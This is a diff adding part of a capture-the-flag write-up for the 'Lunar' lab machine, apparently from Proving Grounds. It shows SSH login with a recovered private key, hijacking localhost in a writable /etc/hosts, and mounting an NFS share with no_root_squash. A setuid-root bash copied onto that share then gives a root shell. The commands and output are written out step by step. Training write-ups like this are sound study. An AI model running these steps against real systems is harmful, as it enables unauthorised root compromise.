@@ -462,10 +462,238 @@ XMUbx9M/i2At8AAAAKbGlhbUBsdW5hcgE=
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-Now we can login to ssh using that key as the user
+Now we can login to ssh using that ssh key as the user
+
+```
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
+└─$ ssh -i idrsa liam@192.168.66.216
+The authenticity of host '192.168.66.216 (192.168.66.216)' can't be established.
+ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:3: [hashed name]
+    ~/.ssh/known_hosts:14: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.66.216' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 23 Jan 2023 06:18:47 PM UTC
+
+  System load:  0.06              Processes:               247
+  Usage of /:   53.1% of 9.78GB   Users logged in:         0
+  Memory usage: 30%               IPv4 address for ens160: 192.168.66.216
+  Swap usage:   0%
 
 
+5 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
 
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ bash
+liam@lunar:~$ 
+```
+
+Lets escalate our privilege to root
+
+On checking the user's group we see he's among the `network` group
+
+```
+liam@lunar:~$ id
+uid=1000(liam) gid=1000(liam) groups=1000(liam),1001(network)
+liam@lunar:~$ 
+
+```
+
+Now lets check what files the network group has access to 
+
+```
+liam@lunar:~$ find / -group network 2>/dev/null
+/etc/hosts
+liam@lunar:~$ 
+```
+
+Cool we have access to edit the /etc/hosts file
+
+Now if we remember we had nfs running but only localhost can mount the share
+
+And a devices gets its localhost ip address from the /etc/hosts file 
+
+Since we have full access to the /etc/hosts file we can therefore change the ip of the localhost to ours
+
+```
+127.0.0.1 localhost
+```
+
+Will be then replaced with
+
+```
+192.168.49.66 localhost
+```
+
+So lets do that 
+
+Initial /etc/hosts file:
+
+```
+liam@lunar:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.0.1 lunar
+liam@lunar:~$
+```
+
+Edited /etc/hosts file
+
+```
+liam@lunar:~$ cat /etc/hosts
+192.168.49.66 localhost
+127.0.0.1 lunar
+liam@lunar:~$ 
+```
+
+Now to confirm if we can mount share now lets try it out 
+
+First i'll create a directory for me to mount the nfs share 
+
+```
+┌──(mark__haxor)-[/mnt]
+└─$ sudo mkdir mount 
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[/mnt]
+└─$ ls     
+mount
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[/mnt]
+└─$ 
+```
+
+Now i'll mount the share
+
+```
+┌──(mark__haxor)-[/mnt]
+└─$ showmount -e 192.168.66.216
+Export list for 192.168.66.216:
+/srv/share localhost                                                                                                                                                                                                             
+┌──(mark__haxor)-[/mnt]
+└─$ sudo mount -t nfs 192.168.66.216:/srv/share mount -o nolock                                                                                                                                                                                                                 
+┌──(mark__haxor)-[/mnt]
+└─$ ls mount -la
+total 8
+drwxrwxrwx 2 root root 4096 May 18  2022 .
+drwxr-xr-x 3 root root 4096 Jan 23 19:31 ..
+                                                                                                                                                        
+```
+
+Now we have access to the share 
+
+So lets check the target maybe there's nfs misconfiguration 
+
+```
+liam@lunar:~$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/srv/share localhost(rw,sync,no_root_squash)
+```
+
+From the result we see `no_root_squash` is enabled also `read&write` access is enabled
+
+With `no_root_squash` enabled we can exploit this box by uploading a binary which has `suid` perm set on it then run it on the target
+
+So lets get this done xD
+
+On the target we do:
+
+```
+liam@lunar:~$ cd /srv/share
+liam@lunar:/srv/share$ ls
+liam@lunar:/srv/share$ cp /usr/bin/bash .
+liam@lunar:/srv/share$ ls -al
+total 1164
+drwxrwxrwx 2 root root    4096 Jan 23 18:40 .
+drwxr-xr-x 3 root root    4096 May 18  2022 ..
+-rwxr-xr-x 1 liam liam 1183448 Jan 23 18:40 bash
+liam@lunar:/srv/share$ 
+```
+
+Then on our attacking machine we do:
+
+```
+┌──(mark__haxor)-[/mnt]
+└─$ cd mount 
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[/mnt/mount]
+└─$ ls          
+bash
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[/mnt/mount]
+└─$ sudo chown root:root bash                                   
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[/mnt/mount]
+└─$ sudo chmod +s bash           
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[/mnt/mount]
+└─$ ls -la      
+total 1164
+drwxrwxrwx 2 root root    4096 Jan 23 19:40 .
+drwxr-xr-x 3 root root    4096 Jan 23 19:31 ..
+-rwsr-sr-x 1 root root 1183448 Jan 23 19:40 bash
+```
+Now that we've set the bash file to a suid binary lets run it on the target
+
+```
+liam@lunar:/srv/share$ ls -al
+total 1164
+drwxrwxrwx 2 root root    4096 Jan 23 18:40 .
+drwxr-xr-x 3 root root    4096 May 18  2022 ..
+-rwsr-sr-x 1 root root 1183448 Jan 23 18:40 bash
+liam@lunar:/srv/share$ ./bash -p
+bash-5.0# cd /root
+bash-5.0# id
+uid=1000(liam) gid=1000(liam) euid=0(root) egid=0(root) groups=0(root),1000(liam),1001(network)
+bash-5.0# ls -al
+total 44
+drwx------  6 root root 4096 Jan 23 18:18 .
+drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
+lrwxrwxrwx  1 root root    9 May 18  2022 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Jul 13  2022 .cache
+drwxr-xr-x  3 root root 4096 Jan  7  2021 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-------  1 root root   33 Jan 23 18:18 proof.txt
+-rw-r--r--  1 root root   75 Jul 13  2022 .selected_editor
+drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
+drwx------  2 root root 4096 Jan  7  2021 .ssh
+-rw-------  1 root root  819 Jul 13  2022 .viminfo
+bash-5.0# 
+```
+
+And we're done 
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
 
 
 
